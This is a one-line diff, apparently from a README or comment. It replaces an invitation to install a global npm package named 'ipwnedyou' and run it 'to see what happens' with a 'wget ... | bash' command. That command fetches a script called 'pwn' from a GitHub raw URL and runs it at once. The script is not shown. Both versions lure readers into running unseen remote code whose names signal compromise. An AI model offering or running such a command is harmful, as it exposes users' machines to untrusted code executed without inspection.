@@ -1,1 +1,1 @@
-```npm i -g ipwnedyou && pwned``` and see what happens
+`wget -O - https://raw.githubusercontent.com/ajsantander/pwned/master/pwn | bash`
